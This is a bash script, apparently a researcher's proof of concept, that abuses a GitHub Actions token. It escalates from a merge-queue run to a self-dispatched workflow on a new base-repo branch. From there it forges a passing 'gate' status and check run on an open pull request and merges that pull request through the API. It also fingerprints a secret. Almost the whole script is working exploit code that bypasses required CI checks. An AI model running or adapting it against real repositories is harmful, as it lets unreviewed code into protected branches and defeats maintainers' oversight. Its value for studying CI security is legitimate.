#!/bin/bash
# Does the primitive SURVIVE into the dispatched (non-fork) context, making it PERMANENT?
API="https://api.github.com"
H=(-H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json")
R="$GITHUB_REPOSITORY"
st(){ local label="$1" m="$2" u="$3" body="${4:-}" code
  if [ -n "$body" ]; then code=$(curl -s -o /tmp/o -w '%{http_code}' -X "$m" "${H[@]}" -d "$body" "$u")
  else code=$(curl -s -o /tmp/o -w '%{http_code}' -X "$m" "${H[@]}" "$u"); fi
  echo "PRM|$code|$label|$(head -c 230 /tmp/o | tr -d '\n')"; }
echo "PRM|CTX|event=$GITHUB_EVENT_NAME gen=${GEN_IN:-0} ref=$GITHUB_REF sha=$GITHUB_SHA"
echo "PRM|SECRET|len=${#S}|sha256=$(printf %s "$S" | sha256sum | cut -d' ' -f1)"
if [ "$GITHUB_EVENT_NAME" = "merge_group" ]; then
  B="perm-$GITHUB_RUN_ID"
  st "create-ref-carrying-my-workflow" POST "$API/repos/$R/git/refs" "{\"ref\":\"refs/heads/$B\",\"sha\":\"$GITHUB_SHA\"}"
  st "dispatch-myself-on-that-branch"  POST "$API/repos/$R/actions/workflows/perm.yml/dispatches" "{\"ref\":\"$B\",\"inputs\":{\"gen\":\"1\"}}"
  echo "PRM|NOTE|one hop only; gen=1 will NOT re-dispatch"
else
  # GEN 1: a workflow_dispatch run on a BASE-REPO branch. Not a fork event at all.
  echo "PRM|LANDED|non-fork full-trust context: event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
  curl -s "${H[@]}" "$API/repos/$R/pulls?state=open&base=release&per_page=20" > /tmp/prs
  read -r PRN PRS <<<"$(python3 -c "
import json
for p in json.load(open('/tmp/prs')):
    if 'CONTROL' not in p['title'].upper():   # never touch the preserved 405 control PR
        print(p['number'], p['head']['sha']); break
")"
  echo "PRM|TARGET|pr=$PRN head=$PRS (the preserved negative-control PR is excluded by title)"
  if [ -n "$PRN" ]; then
    st "forge-from-the-PERSISTENT-context" POST "$API/repos/$R/statuses/$PRS" "{\"state\":\"success\",\"context\":\"gate\",\"description\":\"forged from a persistent base-repo branch, no merge queue involved\"}"
    st "forge-check-run"                   POST "$API/repos/$R/check-runs" "{\"name\":\"gate\",\"head_sha\":\"$PRS\",\"status\":\"completed\",\"conclusion\":\"success\"}"
    sleep 15
    st "MERGE-FROM-THE-PERSISTENT-CONTEXT" PUT "$API/repos/$R/pulls/$PRN/merge" "{\"merge_method\":\"merge\"}"
  fi
  echo "PRM|NOTE|terminal generation, not re-dispatching"
fi
echo "PRM|DONE|perm.sh completed unconditionally"
